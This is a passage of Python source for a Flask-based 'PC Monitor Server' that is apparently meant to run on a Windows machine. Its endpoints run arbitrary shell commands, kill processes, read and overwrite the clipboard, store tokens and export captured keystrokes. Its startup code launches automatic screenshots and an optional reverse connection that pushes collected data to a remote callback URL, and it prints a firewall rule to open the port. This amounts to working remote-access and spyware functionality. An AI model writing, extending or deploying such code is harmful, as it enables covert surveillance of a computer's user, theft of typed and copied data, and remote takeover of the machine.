                    # Wait for termination
                    try:
                        process.wait(timeout=3)
                    except psutil.TimeoutExpired:
                        # Force kill if terminate didn't work
                        process.kill()
                    
                    log_event("process", {"type": "kill", "pid": pid, "name": process_name})
                    return jsonify({'success': True, 'message': f'Process {pid} ({process_name}) terminated'}), 200
                    
                except psutil.NoSuchProcess:
                    return jsonify({'success': False, 'error': f'Process {pid} not found'}), 404
                except psutil.AccessDenied:
                    return jsonify({'success': False, 'error': f'Access denied to process {pid}. Try running server as Administrator'}), 403
                except ValueError:
                    return jsonify({'success': False, 'error': 'Invalid PID - must be a number'}), 400
                except Exception as e:
                    return jsonify({'success': False, 'error': f'Failed to kill process: {str(e)}'}), 500
            
            elif operation == 'start':
                command = data.get('command')
                if not command or not isinstance(command, str):
                    return jsonify({'success': False, 'error': 'Command required'}), 400
                
                try:
                    process = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        creationflags=subprocess.CREATE_NEW_CONSOLE if sys.platform == 'win32' else 0
                    )
                    
                    log_event("process", {"type": "start", "command": command, "pid": process.pid})
                    return jsonify({
                        'success': True,
                        'message': f'Process started',
                        'pid': process.pid
                    }), 200
                    
                except Exception as e:
                    return jsonify({'success': False, 'error': f'Failed to start process: {str(e)}'}), 500
            
            else:
                return jsonify({'success': False, 'error': f'Invalid operation: {operation}'}), 400
        
        return jsonify({'success': False, 'error': 'Method not allowed'}), 405

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/clipboard', methods=['GET', 'POST'])
@require_auth
def clipboard_operations():
    """Handle clipboard monitoring and operations"""
    try:
        if not WINDOWS_SUPPORT:
            return jsonify({'success': False, 'error': 'Clipboard operations only supported on Windows'}), 400
            
        if request.method == 'GET':
            # Get clipboard content
            try:
                import win32clipboard
                
                win32clipboard.OpenClipboard()
                try:
                    # Try to get text from clipboard
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                        content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        content = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        if isinstance(content, bytes):
                            content = content.decode('utf-8', errors='ignore')
                    else:
                        content = ""
                finally:
                    win32clipboard.CloseClipboard()
                
                return jsonify({
                    'success': True,
                    'content': content,
                    'timestamp': datetime.now().isoformat()
                }), 200
                
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to get clipboard: {str(e)}'}), 500
                
        elif request.method == 'POST':
            # Set clipboard content
            data = request.get_json() or {}
            content = data.get('content')
            
            if content is None:
                return jsonify({'success': False, 'error': 'Content required'}), 400
                
            try:
                import win32clipboard
                
                win32clipboard.OpenClipboard()
                try:
                    win32clipboard.EmptyClipboard()
                    win32clipboard.SetClipboardText(str(content), win32clipboard.CF_UNICODETEXT)
                finally:
                    win32clipboard.CloseClipboard()
                
                log_event("clipboard", {"type": "set", "length": len(str(content))})
                return jsonify({
                    'success': True,
                    'message': 'Clipboard content set'
                }), 200
                
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to set clipboard: {str(e)}'}), 500
        
        return jsonify({'success': False, 'error': 'Method not allowed'}), 405
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/token', methods=['GET', 'POST'])
@require_auth
def token_operations():
    """Handle token management operations"""
    try:
        if request.method == 'GET':
            # List available tokens
            tokens_file = DATA_DIR / 'tokens.json'
            
            if not tokens_file.exists():
                return jsonify({'success': True, 'tokens': []}), 200
                
            try:
                with open(tokens_file, 'r') as f:
                    tokens = json.load(f)
                return jsonify({'success': True, 'tokens': tokens}), 200
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to read tokens: {str(e)}'}), 500
                
        elif request.method == 'POST':
            # Add/remove tokens
            data = request.get_json() or {}
            operation = data.get('operation')
            
            if operation not in ['add', 'remove', 'clear']:
                return jsonify({'success': False, 'error': 'Invalid operation'}), 400
                
            tokens_file = DATA_DIR / 'tokens.json'
            tokens = []
            
            # Load existing tokens if file exists
            if tokens_file.exists():
                try:
                    with open(tokens_file, 'r') as f:
                        tokens = json.load(f)
                except Exception:
                    tokens = []
            
            if operation == 'add':
                token_data = data.get('token')
                if not token_data or not isinstance(token_data, dict):
                    return jsonify({'success': False, 'error': 'Invalid token data'}), 400
                
                # Add timestamp if not provided
                if 'timestamp' not in token_data:
                    token_data['timestamp'] = datetime.now().isoformat()
                
                # Add unique ID if not provided
                if 'id' not in token_data:
                    token_data['id'] = str(uuid.uuid4())
                
                tokens.append(token_data)
                log_event("token", {"type": "add", "token_id": token_data['id']})
                
            elif operation == 'remove':
                token_id = data.get('id')
                if not token_id:
                    return jsonify({'success': False, 'error': 'Token ID required'}), 400
                
                original_count = len(tokens)
                tokens = [t for t in tokens if t.get('id') != token_id]
                
                if len(tokens) == original_count:
                    return jsonify({'success': False, 'error': 'Token not found'}), 404
                
                log_event("token", {"type": "remove", "token_id": token_id})
                
            elif operation == 'clear':
                tokens = []
                log_event("token", {"type": "clear"})
            
            # Save tokens
            try:
                os.makedirs(os.path.dirname(tokens_file), exist_ok=True)
                with open(tokens_file, 'w') as f:
                    json.dump(tokens, f, indent=2)
                
                return jsonify({
                    'success': True,
                    'message': f'Token operation {operation} successful',
                    'tokens': tokens
                }), 200
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to save tokens: {str(e)}'}), 500

        # Add this before the final "except Exception as e:" in each route
        return jsonify({'success': False, 'error': 'Method not allowed'}), 405

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/export', methods=['GET'])
@require_auth
def export_data():
    """Export all data"""
    export_type = request.args.get('type', 'events')
    
    if export_type == 'events':
        with events_lock:
            data = events.copy()
    elif export_type == 'keystrokes':
        with keystroke_lock:
            data = keystroke_buffer.copy()
    else:
        return jsonify({"error": "Invalid export type"}), 400
    
    return jsonify(data)

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    # Check if running as a service
    if len(sys.argv) > 1 and sys.argv[1].lower() in ['install', 'remove', 'start', 'stop', 'restart', 'status']:
        # Service commands - print message and exit
        print(f"Service command '{sys.argv[1]}' detected.")
        print("Note: Service installation requires install_service.py module")
        print("Run the server normally without arguments to start monitoring")
        sys.exit(1)
    else:
        # Get network information
        primary_ip = get_local_ip()
        all_ips = get_all_local_ips()
        port = config['port']
        
        # Print startup banner
        print("="*70)
        print("PC MONITOR SERVER - Enhanced Edition")
        print("="*70)
        print(f"\nPC ID: {pc_id}")
        print(f"PC Name: {config.get('pc_name', 'Unknown')}")
        print(f"API Key: {API_KEY}")
        print(f"\nPort: {port}")
        print(f"Binding: {config['host']} (all interfaces)")
        
        print(f"\n{'-'*70}")
        print("CONNECTION INFORMATION")
        print(f"{'-'*70}")
        
        if primary_ip and primary_ip != "0.0.0.0":
            print(f"\n✓ Primary IPv4 Address: {primary_ip}")
            print(f"\n  Connect from remote client using:")
            print(f"  → http://{primary_ip}:{port}")
        
        if all_ips and len(all_ips) > 1:
            print(f"\n  Additional IP addresses detected:")
            for ip in all_ips:
                if ip != primary_ip:
                    print(f"  → http://{ip}:{port}")
        
        print(f"\n  From this PC (localhost):")
        print(f"  → http://127.0.0.1:{port}")
        print(f"  → http://localhost:{port}")
        
        print(f"\n{'-'*70}")
        print("CLIENT CONFIGURATION")
        print(f"{'-'*70}")
        
        if primary_ip and primary_ip != "0.0.0.0":
            print(f'\nCopy this to your client_config.json:')
            print(f'{{')
            print(f'    "server_url": "http://{primary_ip}:{port}",')
            print(f'    "api_key": "{API_KEY}"')
            print(f'}}')
        
        print(f"\n{'-'*70}")
        print("FIREWALL REMINDER")
        print(f"{'-'*70}")
        print(f"\nIf connecting remotely, allow port {port} in firewall:")
        print(f"Run as Administrator:")
        print(f'  netsh advfirewall firewall add rule name="PC Monitor" dir=in action=allow protocol=TCP localport={port}')
        
        print(f"\n{'-'*70}")
        print(f"\nData directory: {DATA_DIR.absolute()}")
        print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")
        print("\nWindows Support:", "Enabled" if WINDOWS_SUPPORT else "Disabled")
        
        # Check for reverse connection config
        callback_config = load_callback_config()
        if callback_config.get('enabled'):
            print(f"\n{'-'*70}")
            print("REVERSE CONNECTION")
            print(f"{'-'*70}")
            print(f"Status: ENABLED")
            print(f"Callback URL: {callback_config.get('callback_url')}")
            print(f"Interval: {callback_config.get('interval')}s")
            print("Server will push data to client automatically")
        
        print("="*70)
        print("\nServer starting... Press Ctrl+C to stop")
        print("="*70 + "\n")
        
        # Start background threads
        screenshot_thread = Thread(target=auto_screenshot_thread, daemon=True)
        screenshot_thread.start()
        
        # Load auto-screenshot settings
        auto_screenshot_enabled = config.get('auto_screenshot', False)
        auto_screenshot_interval = config.get('screenshot_interval', 300)
        
        # Start reverse connection if configured
        reverse_conn = None
        if callback_config.get('enabled'):
            reverse_conn = ReverseConnection(callback_config)
            reverse_conn.start()
        
        # Start Flask server
        try:
            app.run(
                host=config['host'],
                port=config['port'],
                debug=False,
                threaded=True
            )
        except KeyboardInterrupt:
            print("\n\nServer stopped by user")
            stop_monitoring()
            if reverse_conn:
                reverse_conn.stop()
            sys.exit(0)